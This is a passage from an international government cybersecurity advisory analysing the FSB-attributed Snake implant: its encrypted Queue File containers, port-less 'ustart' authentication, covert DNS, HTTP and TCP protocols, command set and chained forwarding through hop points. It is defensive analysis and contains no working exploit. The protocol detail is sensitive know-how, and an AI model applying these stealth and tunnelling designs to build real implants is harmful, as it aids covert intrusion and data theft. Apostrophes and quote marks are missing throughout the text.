structure. The Queue Items in each Container are distinguished by their corresponding Item Number
as well as their Item Type identifier. The Item Number is assigned by the Snake implant itself, while
Snake operators generally refer to the Item Type value when trying to reference a specific item.
Queue File Encryption
In previous versions of Snake, the Queue File existed within an encrypted covert store. The data
belonging to the Queue Items themselves were also CAST-128 encrypted. In more recent versions,
the covert store was removed, and the Queue File exists by itself on disk. The Queue Items inside the
Queue File are still encrypted with CAST-128, and in addition, the full Queue File is also CAST-128
encrypted. The CAST keys used to encrypt the Queue Items within a Container Instance can be
found in that Instance's corresponding 0x2 Container as Item Type 0x229 (see below). The key and
IV used to encrypt the Queue File can be found by decoding strings within Snake
s kernel driver.
Page 12 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Container Descriptions
0xb Container
The 0xb Container lists the available modes of operation for a given Snake implant. When using a
certain mode, Snake uses a specific set of Containers and communication channels. Each infection
can use up to four different modes. Each mode in the 0xb Container will have a Container Instance
value that all Containers associated with this mode will use, except for the 0x3 Container.15
0x0 Container
The 0x0 Container handles incoming commands/data for the host of the Snake infection. Commands
will be queued in this Container until the implant is ready to execute them.
MITRE ATT&CK IDs: [T1104]
Page 13 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
0x1 Container
The 0x1 Container handles outbound commands/data for the host of the Snake infection. The data
will be queued within the 0x1 Container until the implant is ready to exfiltrate them.
0x2 Container
The 0x2 Container holds the configuration information for the mode to which it corresponds. Various
pieces of information vital to Snake
s successful operation are stored within these Containers. This
subsection will discuss a subset of the parameters that can be found within the 0x2 Container.
Page 14 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Pivotal key information can be found within the 0x2 Containers. This includes the inbound and
outbound RSA keys (Items 0x228 and 0x227, respectively), the CAST key (Item 0x229) used to
encrypt the individual items within the Queue Container, pre-shared keys used for the top layer of
encryption in Snake
s network communication protocol, and a quasi-unique value for the implant,
called the 
ustart
 value, needed for Snake network connectivity.
Snake is constantly passing data between its kernel and user mode components. The methodology
(generally, named pipes) used to make these communications is listed in Items 0x65-0x6f of the 0x2
Container. Items 0x70-0x7a list the parameters necessary to establish these communications.16
Items 0xc9-0xd3 contain details of up to ten other Snake infections, referred to as 
communication
channels
, which the implant can communicate with during Passive Operations. The parameters
needed to establish Snake sessions with the other hosts can be found in Items 0xd4-0xde.
Many additional data points, such as the process name where Snake injected itself or the modules
Snake has loaded from its 0x3 Container, can be found within 0x2 Containers.
0x3 Container
The 0x3 Container houses embedded files and modules for Snake. A single 0x3 Container will be
accessible to all Containers in the Queue. The 0x3 Container has its own dedicated 0x2 Container
that only includes a single Queue Item of Item Type 0x229 (a CAST-128 key). This key will be used to
encrypt and decrypt all of the embedded files and modules within the 0x3 Container.
MITRE ATT&CK IDs: [T1559]
Page 15 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
The Item Types assigned to the embedded files and modules within the 0x3 Container are consistent
across all of the Snake infections within Snake
s P2P network. For example, the 0x01 Item Type is
the Zlib library, and therefore any time an Item Type of 0x01 is seen within the 0x3 Container of a
Snake infection, that file is always the Zlib library. The implant
s 0x2 Container will keep track of
libraries that it has loaded. If the DLL is a file on disk, the full path to the DLL is saved in the 0x2
Container. If the library was loaded from a 0x3 Container, the loaded module will be displayed in the
implant
s 0x2 Container in the format 
&<Item Type (within 3 container) of loaded module>
0x4 Container
The 0x4 Container logs command activity. Each Queue Item within the Container is a log of a single
executed or attempted command. Each mode will have its own corresponding 0x4 Container.
0x5 Container
The 0x5 Container holds Snake network logs, noting any IP address that has connected to this
implant. Some versions of Snake no longer make use of this Container.
0x6 Container
The 0x6 Container saves commands that are set to execute at specific times. A Queue Item is
created for each scheduled command.
0x7 Container
The 0x7 Container logs the IP addresses of any other Snake implants that have connected to this
implant during Passive Operations. The commands 0x79 (Read Agents Track) and 0x7a (Clear
Agents Track) are used to interact with this Container. Note that the command 0x7a had been
deprecated in some versions of Snake and returns the error 
function unsupported
 if called.
MITRE ATT&CK IDs: [T1055.001]
Page 16 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
SNAKE NETWORK COMMUNICATIONS
Snake
s network communications are encrypted, fragmented, and sent using custom methodologies
that ride over common network protocols, including both raw TCP and UDP sockets and higher-level
protocols like HTTP, SMTP, and DNS. Snake
s protocols for HTTP and TCP are the most commonly
seen, but functionality exists for UDP, ICMP, and raw IP traffic. Snake
s network communications are
comprised of 
sessions
, which are distinct from the sessions associated with the legitimate protocol it
is riding on top of (e.g., TCP sessions). The Snake session is then comprised of distinct commands.
Both Snake
s custom transport encryption layer (
) and Snake
s Application Layer have their own
encryption mechanisms, where the enc layer operates on an individual P2P session and the Snake
Application Layer provides end-to-end encryption between the controller (i.e., point of origin) and the
command
s ultimate destination. The following figure details Snake
s communication protocol stack.18
Network Obfuscation
Snake
s use of its kernel module also facilitates stealthy network communications. To participate fully
in Snake
s P2P network, implanted machines which are not the ultimate target must act as servers for
other Snake nodes. Snake
s kernel module, along with a thoughtfully designed mechanism for
distinguishing Snake traffic from legitimate client traffic, allows the implant to function as a server in
the Snake P2P network without opening any new ports, greatly complicating detection efforts.
Additionally, Snake
s custom network communication protocols are designed to blend with traffic that
the compromised server normally would receive. This allows Snake operators to use legitimate
servers as infrastructure, which reduces the effectiveness of simple IP address or domain blocking
without needing to open new ports or send unusual looking traffic to this infrastructure.19
Snake
s Network Authentication Technique (
ustart
Snake uses its custom HTTP and raw socket TCP based protocols for large data communications.
With these protocols and others, Snake employs a specific authentication mechanism to distinguish
Snake traffic from legitimate traffic destined for application software on the compromised server. This
MITRE ATT&CK IDs: [T1001.003], [T1071], [T1071.003], [T1090.003], [T1095], [T1132], [T1572], [T1573]
MITRE ATT&CK IDs: [T1001.003], [T1071], [T1132.002], [T1547.006], [T1584]
Page 17 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
technique enables one of the uniquely sophisticated aspects of Snake, which is its ability to function
effectively as server software without opening any further ports on the compromised system. The
relevant per-implant authentication value is referred to as the 
ustart
 and is stored in the implant
Queue File. There are multiple forms of the ustart value, including 
ustart
ustart2
, and 
ustartl
Rather than open a listening socket on a specified TCP port, the Snake kernel module intercepts the
first client-to-server packet following the 3-way handshake in every TCP session. The kernel module
then determines whether or not the contents of that packet are in fact valid for the ustart value of that
target Snake implant. If so, the Snake kernel module forwards that packet and any future packets in
the same TCP session to Snake
s own processing functionality, and the (presumably legitimate)
application listening on that port remains unaware of this TCP session. If not, the Snake kernel
module allows the packet
and the rest of the TCP session as it occurs
to reach the legitimate
listening application, for example web server software. See the following for an illustration.21
All of the ustart versions perform authentication by sending a random nonce along with data that
comprises a mathematical operation on the combination of the nonce and the ustart value itself. The
MITRE ATT&CK IDs: [T1132.002], [T1572]
MITRE ATT&CK IDs: [T1071.001], [T1547.006]
Page 18 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
receiving machine then extracts the nonce and performs the same computations to authenticate the
sending machine. The ustart2 and ustartl versions use the Fowler-Noll-Vo (FNV) hash algorithm to
generate the overall authentication value from the nonce and the ustart. This mechanism is slightly
different in the custom Snake HTTP protocol versus the custom Snake TCP protocol.
Using the ustart methodology, a node in the Snake P2P network can function as a server without
opening any otherwise closed ports and without interfering in the compromised server
s legitimate
functionality. Snake will only communicate over TCP ports on which another application is actively
listening. This technique makes detecting Snake compromises through network traffic monitoring far
more difficult. Inbound traffic to an unexpected TCP port can be detected or blocked using standard
firewall or network intrusion detection functionality. Replacing a legitimate service application with a
modified executable can lead to detection at either the host or network level. Snake
s technique
bypasses both of these mitigations. When combined with the fact that Snake traffic looks similar to
expected traffic, especially in the case of Snake
s HTTP based protocols, this renders detecting
Snake communications difficult absent detailed knowledge of Snake
s custom protocols.
Snake UDP
Outbound Communications via DNS Query
Snake uses a specialized communications protocol to encode information in seemingly standard DNS
queries run via the Windows or POSIX API function gethostbyname, depending on the version.22
Snake outbound DNS requests consist of character strings that are constructed to resemble standard
domain names. The actual information being transmitted from the implant is contained in the part of
the character string prior to the first 
 character. For illustration purposes, this subsection will outline
how an arbitrary string of bytes is manipulated and then encoded to form an outbound Snake DNS
request carrying data provided by the implant.
Snake outbound DNS requests originally take the form of byte arrays stored on the stack as the
implant progresses through the communications function. The byte array has the following structure.
Only the low-order seven bits of the flags byte are used, and they have the following significance.
MITRE ATT&CK IDs: [T1001.003], [T1071.004], [T1132.002]
Page 19 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
After calculating and obfuscating the byte array values shown above, Snake encodes these byte
values as de-facto base32 text, using the ten digits 0-9 and the 26 lowercase ASCII letters a-z, with v,
w, x, y, and z all corresponding to the same value, as only 32 distinct characters are needed. Snake
then inserts 
 characters at specified locations and sends the DNS request using the gethostbyname
function. The resulting encoded string mimics a legitimate DNS request; because characters after the
first 
 are not part of the implant
s communications, any arbitrary suffix (e.g., 
.com
) can be used.23
Inbound Communications via DNS Query Response
After sending the encoded DNS request, Snake parses the returned information. In a normal DNS
request, the returned hostent structure contains a list of IPv4 addresses as 32-bit unsigned integers if
the domain resolves to one or more IPv4 addresses. In the Snake DNS protocol, these 32-bit integers
represent the covert channel data. The Snake implant sorts the 32-bit integers by the highest order
nibble and then interprets the remaining 28 bits of each integer as the actual encoded data.
The Snake DNS protocol thus provides a well-concealed, low-bandwidth communications channel.
For larger bandwidth communications, Snake uses its custom HTTP and TCP protocols.
Snake HTTP
The most common custom protocol that Snake uses is its 
http
 protocol, which rides on top of
standard HTTP. It generally looks like normal HTTP communications, including a lot of base64looking strings, thus blending well with normal network traffic. There have been multiple iterations of
Snake
s http protocol, though the differences are only in the encoding; once that is peeled away, the
underlying Snake http protocol is the same. For the purposes of this document, Snake
s former
version of HTTP will be referred to as 
http
 and its more recent version as 
http2
Snake communications using http2 are contained within seemingly legitimate Application Layer HTTP
communications. In the client-to-server direction, the implant data is contained within an HTTP header
field of a GET request, unless the data is over a certain size (usually 256 bytes, but configurable).
Observed field keys have included: Auth-Data, Cache-Auth, Cookie, and Cockie (note misspelling).
This list is not exhaustive; any standard HTTP header field can be used. The communication itself is
contained in the legitimate HTTP header field
s value, meaning the content following the 
 character
and any whitespace immediately thereafter. In HTTP GET requests, the implant generally uses the
default path 
, but this is not required and is configurable.25
MITRE ATT&CK IDs: [T1001.003], [T1071.004], [T1132.002]
MITRE ATT&CK IDs: [T1001.003], [T1071.001], [T1572]
MITRE ATT&CK IDs: [T1001.003], [T1071.001]
Page 20 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
Larger client-to-server Snake http2 requests are contained in the body of an HTTP POST request,
and server-to-client communications are contained in the body of the HTTP response.
All client-to-server Snake http and http2 requests begin with the ustart authentication. The specifics
vary with each ustart version, but in each case the random nonce and the computed function of the
nonce and ustart value are encoded in a manner which closely resembles the rest of the Snake
communication. Since Snake http and http2 implant sessions can span multiple TCP sessions, the
ustart authentication mechanism is included in every client-to-server communication.
Base62 Encoding
Snake
s http2 protocol uses a custom base62 encoding scheme that has the following differences
from base64. Base62 uses 62 semantically significant characters instead of 64. The ratio of encodedto-decoded characters in base62 is less dense (11:8) than the ratio base64 can achieve (12:9). Also,
base62 uses extraneous characters in certain instances that have no semantic significance.26
The base62 characters of semantic significance are the 62 strict alphanumeric characters: [0-9A-Zaz]. The extraneous characters that can be present in a base62 string
but which have no semantic
significance
are: 
, and 
 (underscore). When present, these characters are removed prior
to performing the decoding process. A valid base62 string can have up to 11 of these extraneous
characters. A regular expression for base62 is included in the Mitigations section of this CSA.
http and http2 Metadata Structure
After the base62 decoding is completed, if necessary, the remaining data begins with an 8-byte
metadata structure that provides rudimentary sessionization on top of the stateless HTTP. Snake
http and http2 client-to-server communications have three de-facto parts, which are concatenated into
a single HTTP header value. These parts are: 1) an announce or authentication string, 2) a custom
metadata structure, and 3) payload data. The metadata structure consists of the following:
struct http_meta {
uint32_t session_number;
uint16_t communication_number;
uint8_t flags;
uint8_t checksum;
Snake uses the session_number and communication_number fields to provide its own custom
sessionization on top of the stateless Application Layer HTTP protocol. The checksum byte serves to
validate the integrity of the structure and must equal the sum of the first seven bytes modulo 256.
Snake TCP
Snake has the ability to communicate through POSIX-style TCP sockets. The implant
s custom TCP
protocol, which herein will be called 
, uses the reliability features of the underlying TCP protocol.
Thus, in the implant
s custom tcp protocol, the concept of a TCP session and an implant 
session
 are
the same, whereas in the implant
s custom http protocols, one implant session could span multiple
MITRE ATT&CK IDs: [T1132.002], [T1572]
Page 21 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
Transport Layer TCP sessions. Since the implant
s overall communications protocol is based on the
idea of commands and responses, Snake depends on being able to specify the length of any given
command and response so the recipient Snake node knows when a particular communication ends.
Snake achieves this in the custom tcp protocol by prefacing each communication with its length
encoded as a 32-bit big-endian unsigned integer.27
Immediately following the TCP 3-way handshake, the implant completes the ustart authentication for
this session. Since Snake tcp sessions are mapped one-to-one with an underlying protocol TCP
session, the ustart authentication only occurs once per session, rather than with each client-to-server
communication as in Snake http and http2. The Snake tcp ustart mechanism is similar to the Snake
http and http2 mechanisms, except that for certain ustart versions, Snake tcp uses a raw binary ustart
which is not encoded in printable characters.
After the ustart authentication, the implant will begin sending length-data pairs. These pairs can be
sent in the same packet or in two (or theoretically more) separate packets, but the pattern of lengthdata pairs will be present in each half of the stream (i.e., each direction) for the entirety of the implant
communications for the remainder of the TCP session. Specifically, a length-data pair will consist of
the length encoded as a big-endian 32-bit unsigned integer followed by data of exactly that length.
For example, consider the instance where the implant is sending the following 4 arbitrary bytes:28
89 ab cd ef
The on-wire communication from the implant would send the integer value 4 encoded as a big-endian
32-bit integer, followed by the actual 4 bytes themselves, as shown below. This could be split across
two (or theoretically more) packets.
00 00 00 04 89 ab cd ef
The custom tcp protocol (as well as all custom http protocols) have been used in conjunction with the
Snake enc protocol. Details of the Snake enc protocol are provided in the following subsection. Due
to the manner in which the Snake enc and Snake tcp protocols interact, the first six length-data pairs
of each TCP half-stream (following the single client-to-server announce or authentication packet
described above) will have known lengths. Specifically, each half-stream will begin with length-data
pairs of the following lengths: 0x8, 0x4, 0x10, 0x1, 0x10, 0x10. Note that these are the lengths of the
raw data, so each communication will be preceded by a 4-byte big-endian integer specifying the
corresponding length. Thus, one of the half-streams could have the following TCP content:
00 00 00 08 12 34 56 78 9a bc de f0
00 00 00 04 89 ab cd ef
00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0
00 00 00 01 12
00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0
00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0
MITRE ATT&CK IDs: [T1001.003], [T1071.001]
MITRE ATT&CK IDs: [T1132.002]
Page 22 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Snake 
 Layer
As described above, Snake communications are all comprised of 
Snake sessions
, irrespective of
whichever legitimate protocol Snake is operating on top of. Snake
s top layer of encryption, called the
enc layer, utilizes a multi-step process to establish a unique session key. The session key is formed
through the combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) known
to both parties. This PSK is stored in one of the communication channels, stored within the Queue.29
The overall establishment of the session key requires 12 communication steps, six in each direction,
which involve sharing the pseudo-random values used in the Diffie-Hellman exchange process as
well as custom aspects of the Snake session key derivation method. The session key is used to
encrypt the command headers and (inner) encrypted payloads.
This is the layer in which the critical error of providing a value of 128 bits instead of 128 bytes for the
call to DH_generate_parameters within the OpenSSL library occurred. Due to this insufficient key
length, breaking the Diffie-Hellman portion of the exchange is possible. Note that in the following
figure, the variables 
, and 
 are used in standard descriptions of Diffie-Hellman.
MITRE ATT&CK IDs: [T1573], [T1573.002], [T1610]
Page 23 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
SNAKE APPLICATION LAYER
Snake
s Application Layer is used to process Snake commands. The payload data for a Snake
session can contain one or more command exchanges, which include both the incoming data sent to
the implant as well as the response returned to the server. Each command is associated with a
specific ordinal, and due to Snake
s modular design, operators are able to add new commands to
extend Snake
s capabilities by remotely loading a new module.
The Snake implant differentiates between High and Low commands and handles them differently,
based on the ordinal number range. The majority of Snake commands are High commands that have
an ordinal of 0x64 (100 decimal) or higher. There are far fewer Low commands, and these include the
Forwarding command (with ordinal 0x1), and the four Queue commands (with ordinals 0xa, 0xb, 0xc,
and 0xd). While Low commands are mostly used for moving data across the network, the High
commands give the operator many options for interacting with an infected system.30
Command 0x15-byte Header
All commands begin with a 0x15-byte header, followed by optional command parameter data; only
some commands require parameters for successful execution. For example, the command Get, which
exfiltrates a file, requires the name of the file to exfiltrate, whereas the command Process List, which
returns a process listing, does not require any parameters.31
The most important Command Header field contains the integer ordinal of the command being sent.
The Item UID field represents a unique identifier for each individual command instance, and these
values increase sequentially. The header has two fields used when a command is set to run at a
specified date and time; these commands will be written to the 0x6 Container.
Some Low commands have another header before the payload data, which will be detailed below. All
other commands have only the Command Header followed by the encrypted parameter data.
Command Encryption
Underneath Snake http2 or tcp encryption at the session layer, each command exchange is further
encrypted. In older versions of Snake, the exchanges were CAST-128 encrypted using a different key
for incoming and outgoing data. These keys were saved in the 0x2 Container in the 0x227 and 0x228
MITRE ATT&CK IDs: [T1001], [T1104]
MITRE ATT&CK IDs: [T1074], [T1119], [T1560.003]
Page 24 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Items. The incoming payload data, if parameter data was present, could be decrypted with the 0x227
CAST key. Any response data was encrypted with the 0x228 CAST key.32
In recent versions, the 0x227 and 0x228 Items hold two RSA-4096 public keys. For each side of an
exchange, a new 16-byte CAST key is created with Microsoft
s CryptoAPI CryptGenRandom function
to obtain 16 random bytes. This key is used to CAST-128 encrypt the parameter or response data.
For an incoming command, the CAST key is signed (not encrypted) by the private key corresponding
to the public key on the node to create a 512-byte RSA data blob. The incoming payload has the RSA
blob, followed by the optional parameter data, which is CAST-128 encrypted. Snake uses the 0x227
RSA public key to decrypt the RSA blob, recover the CAST key, then decrypt the parameter data.
For an outgoing command, a new CAST key is obtained from CryptGenRandom, and any response
data is CAST-128 encrypted. The key is then encrypted using the 0x228 public key to create a 512byte data blob. The response payload data contains the 512-byte RSA blob, followed by the
encrypted response data, when present.
Command Decoding
The implant will expect data in a specific format for each command ordinal. Parameter and response
data contain several possible underlying data types, including wide-character plaintext strings,
numeric values, data tables, files, or a combination of multiple types.33
The parameter data buffer itself will be formatted in a specific way, depending on the command
ordinal. Some commands have required parameters, as well as optional parameters. Commands with
optional parameters will include a metadata header with the data length and data type (e.g., bool,
integer, text, or data buffer) before the optional parameter
s data. Other commands will expect the
parameters to be formatted with length-data pairs, consisting of the parameter data length encoded
as a four-byte big-endian integer followed by data of exactly that length. Still other commands have a
custom header or will expect no length or metadata and will simply send the parameter data alone.
The response data will similarly be formatted by the implant in a specific way according to the
command ordinal. The response data typically does not have a length or metadata preceding it, with
the exception of the data tables. Examples of commands that return a table are the Process List
command and the List Dir command.
Response data that includes a table will start with a table description header that indicates the
number of columns and rows in the table. In addition, the header will include a Column Descriptor
structure to indicate the type of data that column will contain, for example a string, uint32 or uint64,
timestamp in epoch format, or the contents of a whole file (included as a table entry).
After the table description header, each field is added to the data payload buffer one at a time in a
length-data pair. The fields across the first row are added in order, then the fields across the second
row are added immediately after the first row with no metadata or separation, and so on. To parse this
table, the server will account for the number of columns to determine where the next row starts.
MITRE ATT&CK IDs: [T1573]
MITRE ATT&CK IDs: [T1132.002]
Page 25 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
High Commands
High commands are those with an ordinal of 0x64 (decimal 100) or higher. High commands give the
operator many options for interacting with an infected system, as well as implant components. This
subsection will describe some examples of the many High commands that can exist in the implant.
Some of the most basic High commands will gather information about the machine and return the
results. For example, the FSB operators can use the PS command (0x65) to return a list of running
processes, the List Dir command (0x840) to list the contents of a directory, or the Syst command
(0x6b) to gather basic system information.
There are several commands that interact with the infected machine using standard built-in OS tools.
The operator can use the Kill command (0x67) to kill a process, the Get command (0x68) to exfiltrate
a file, the Put command (0x69) to write a file, the Del command (0x6a) to delete a file, or the Run
command (0x66) to execute a command in a terminal shell and receive the results. For example,
operators have used the Run command to run PowerShell commands, ping other hosts, use the
Windows 
net use
 command to map network drives, and to run executable files that had been
previously written to the node using the Put command.34
MITRE ATT&CK IDs: [T1059.001]
Page 26 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
In addition to commands that use the built-in OS functionality, there are several High commands that
interact with Snake components. An operator can use the Read Config command (0x70) to read the
0x2 Container, which contains configuration data, or the Set Config Item command (0x71) to set a
specific Queue Item within the 0x2 Container. For example, operators have used the Set Config Item
command to add or update the IP addresses or domains and option parameters used to communicate
with other Snake nodes. The Read Agents Track and Clear Agents Track commands (0x79 and 0x7a)
interact with the 0x7 Container to read or delete logs which track which other Snake nodes have
connected to this node. Note that the 0x7a command has been deprecated in some versions of
Snake and returns the error 
function unsupported
 if called.
Snake has the ability to add additional commands by loading new modules. New modules can be
loaded using the Load Modules command (0x72) or directly into memory using the Load Modules
Mem command (0x7f). When compiling a module, the developer will assign an ordinal to each
constituent command, which will then be used by the operator to call the newly added commands.
These loaded modules can be removed using the Module Unload command (0x73).
Queue Commands
The Snake commands with ordinals 0xa, 0xb, 0xc, and 0xd are used to enumerate, read, write, and
delete items from the 0x0 or 0x1 Queue Containers, respectively. Note that these commands are not
used to manipulate any other Containers.35
Queue Command Header
The four Queue commands contain a 0x3d-byte Queue Header following the Command Header. In
more recent versions of Snake, this header is encrypted using the same CAST key used to encrypt
the payload data. In this case, the Command Header is followed by the 512-byte RSA encrypted
CAST key blob, the encrypted Queue Header, and finally the encrypted payload data.36
Even though each of the four Queue commands only use a subset of the fields of the Queue Header
(in different ways), the full header must be present for the command to be considered valid by the
implant. Two fields in the header that all four Queue commands use are the Container Instance and
Container Type fields, which indicate the specific Container on a node the Queue command intends
to interact with. In the Queue Read and Write commands, the Item Type field is used to track the
specific commands and their responses in the Containers.
MITRE ATT&CK IDs: [T1001], [T1104]
MITRE ATT&CK IDs: [T1573]
Page 27 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Queue Enumerate Command
The Queue Enumerate command, with ordinal 0xa, is used to enumerate the contents of the 0x0 or
0x1 Containers to list all incoming or outgoing commands, respectively. The enumeration returns the
0x40-byte structure described above for each Queue Item, concatenated into a single return buffer.
Queue Read Command
The Queue Read command, with ordinal 0xb, is used to read an Item from the specified 0x0 or 0x1
Container. Several relevant fields in the Queue Header determine how the data is sent and stored.
For example, the header determines whether the data should be sent immediately back to the server
or stored for later transport. The header indicates if the implant should send the Queue Item
s header
(i.e., the same 0x40-byte metadata structure returned by the 0xa command), the Item
s data, or both.
The header also indicates whether the Queue Item should be deleted after being read and can also
indicate that Queue Items with a lower Item Type should be deleted. This allows FSB operators to
clear out all command Items previous to the one being read.
Queue Write Command
The Queue Write command, with ordinal 0xc, is used to write a Queue Item to the specified 0x0 or
0x1 Container. The Queue Header will indicate if a new Queue Item will be created, or an existing
Queue Item will be modified.
If a Queue Item is set to be modified, an Item with the specified Item Type must exist in the specified
Container. Several fields in the header must match specific attributes of the existing Queue Item. If
these checks are met, the parameter data is written to the Queue Item. Fields in the Queue Header
will indicate the length of data to be written, and the offset into the existing Queue Item where the
write should begin.
If a Queue Item is set to be created, Snake will delete existing Queue Items of the specified Item
Type in the Container of interest, then create a new Item of the specified Item Type and write the
parameter data to the Queue Item. A field in the Queue Header will indicate the length of data to be
written.
Queue Delete Command
The Queue Delete command, with ordinal 0xd, is used to delete a Queue Item from the specified 0x0
or 0x1 Container. The Flags field will determine if the single Queue Item should be deleted, or if all
Queue Items with a lower Item Type should be deleted as well.
Forward Commands
Forward commands, with command ordinal 0x1, are used to tell an implant to forward a Snake
command to a second target node, where the command will be executed. The target node sends the
response data back to the first implant, which will then package that response data as its own
response back to the caller.
The command is designed to tell an implant to forward one command to another implant, but in
practice, Forward commands are often built on top of each other to create a chain of hop points that
Page 28 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
will continue to forward a command to an end point, where it will be executed. The response data is
then sent back through the same chain of hop points until it reaches the operator.37
The Forward command has a 0x199-byte Forward Header, followed by the encrypted command
parameter data that will be sent to the target node of the Forward command. The Forward Header
contains the information the implant will need to connect to the target node, including the ordinal of
the Snake command that is being forwarded to the target node for execution.
The implant that receives the Forward command will construct a new Snake command of the ordinal
indicated in the Forward Header. It will connect to the target node in a new session, construct the
Command Header, and send the encrypted command parameter data on to the target node. The
parameter data already will have been encrypted using the key associated with the target node, so
that the target implant will be able to decrypt the parameter data and execute the command.
When the Forward command is constructed, the CAST key used to CAST-128 encrypt the payload
data
to include the 0x199-byte header and the parameter data to be forwarded
is encrypted with
the RSA key pair used by the first implant. The parameter data that contains the parameters for the
command to be forwarded is also CAST-128 encrypted, but the key used to encrypt the parameter
data is encrypted with the RSA key pair used by the target node. The first implant knows through the
header what command ordinal it is forwarding, but it is unable to decrypt the parameter data.
If the Forward Header sent to the first implant indicates that the command to be forwarded was
another Forward command, the first target node will decrypt the parameter data and find another
Forward Header. This first target node implant will then go through the same process to connect to
the next target node, constructing the new command with the ordinal indicated in the second Forward
Header to send the remaining encrypted parameter data to the next target node. This will repeat until
the command to be forwarded is something other than another Forward command.
The Command Header and pertinent parameters for each target node are encrypted specifically for
that node by the operator before the Forward command is sent into the Snake P2P network. To
illustrate, the diagram below shows how the buffer might look when several Forward commands are
chained together to include two hop points and an end point. The first hop point (HP1) will recover the
first CAST key and CAST-128 decrypt the rest of the buffer, which will uncover the first Forward
Header. HP1 will then forward the remainder of the decrypted buffer to the next hop point (HP2),
starting with the second CAST key blob. HP2 will recover the second CAST key and CAST-128
decrypt the rest of the buffer, which will uncover the second Forward Header. HP2 will then forward
the remainder of the decrypted buffer to the end point, starting with the third CAST key blob. The end
point will recover the CAST key, decrypt the command parameter data, and execute the command.
When a target machine has executed a forwarded command, the return data is encrypted with that
implant
s RSA keys and returned directly to the previous hop point. As the data is returned up the
chain in the Snake P2P network, the intermediate hop points do not manipulate the encrypted data,
as they do not have the RSA private key necessary to do so. In this manner, the return data is defacto end-to-end encrypted throughout the P2P network until it arrives back at the FSB operator.
MITRE ATT&CK IDs: [T1090.003], [T1573]
Page 29 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Page 30 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
SNAKE IMPLANT OPERATION
Snake uses two main methods for communication and command execution, namely Passive and
Active. In general, Snake operators will employ Active operations to communicate with hop points
within Snake
s infrastructure; however, hop points can and do sometimes operate using Snake
Passive method. Snake
s end points tend to solely operate using the Passive method.38
Active Operations
During Active operations, Snake commands are issued by an FSB operator or a script to a target
machine, generally through Forward commands (described in the previous section). The response to
the command is immediately returned to the point of origin following the same path that the command
took to reach its end target, as shown in the previous figure on Forward command structure.
Passive Operations
During Passive operations, Snake implants operate on their own, without the synchronous interaction
of FSB operators. The nodes with which an implant communicates during Passive operations are
stored within its 0x2 Container(s) as communication channels. Up to ten communication channels can
be present at any time; an operator can change these channels via the Set Config Item command.
Passive Intake
During Passive operations, the implant will beacon by sending a Queue Read (0xb) command to one
of its stored communication channels that it has chosen at random. These Queue Read commands
look for a Queue Item within a Container with an Instance Number equal to the implant
s UID. The
matching UID indicates the Queue Items in this Container are intended for the beaconing implant.
If such a Queue Item is found, the beaconing implant will read in the Queue Item and delete it off of
the host from which it was read. There can be multiple Queue Items found within the specified Queue
Container that was beaconed to; each Queue Read command will read one of these items. This
process is repeated until all items within the Container are read, which the infrastructure node will
indicate by sending a specific error in response to the Queue Read. This beaconing will continue to
randomly select hosts at nondeterministic time intervals for as long as the implant is set to perform
Passive operations.
Passive Data Exfiltration
Similar to how Snake intakes commands passively, it can also exfiltrate the resulting data passively.
This is done using Queue Write (0xc) commands to write to one of the stored communication
channels chosen at random. Once the data is off the end point node, operators generally retrieve it
manually or using a script. The Item Type field, which is unique per executed Snake command, is
needed to associate the exfiltrated data with the target node on which the command was run.
In the context of Passive Snake communications, the term Item Type is defined as a UID for a given
Snake command and its resulting data. The Item Type serves as a unique identifier to associate the
results of command execution with the original command written by the operator. When the FSB
MITRE ATT&CK IDs: [T1104]
Page 31 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
collects the data, Snake knows exactly what infection the data came from, and therefore it can
determine what key to use to successfully decrypt the data.
Page 32 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
To illustrate how Passive operations are conducted between the end points, the operator, and the hop
points in between, see the diagram above, which is explained further by the following steps:39
(1), (2): During Passive operations, the Node randomly chooses a host from amongst its
stored communication channels and will beacon out to it with a Queue Read command (Hop
Point 1 in this case). The Item Type for these beacons will be one greater than the Item Type
of the last command received by the Node, indicating in this example that a command of Item
Type 0x08 was the last command that was read in by the Node during Passive operations.
This Node will continue to beacon with Item Type 0x09 until it receives a command, via
Passive operations, with an Item Type of 0x09 or greater. The lines are dotted for (1) and (2)
as this activity will be repeated at random intervals until a successful Queue Read occurs.
(3), (4): In these steps, the operator uses a Queue Write command to write a command to Hop
Point 140 that is ultimately intended for the Node. The Item Type of the command being written
to Hop Point 1 is assigned 0x20 (for this example). Note that the path of this command, its
execution, and its results making it back to the operator can be tracked via the red text.
(5), (6): The Node continues to beacon out looking for commands to read in (5). The return (6)
is successful, and the command written by the operator to Hop Point 1 (3) is read in by the
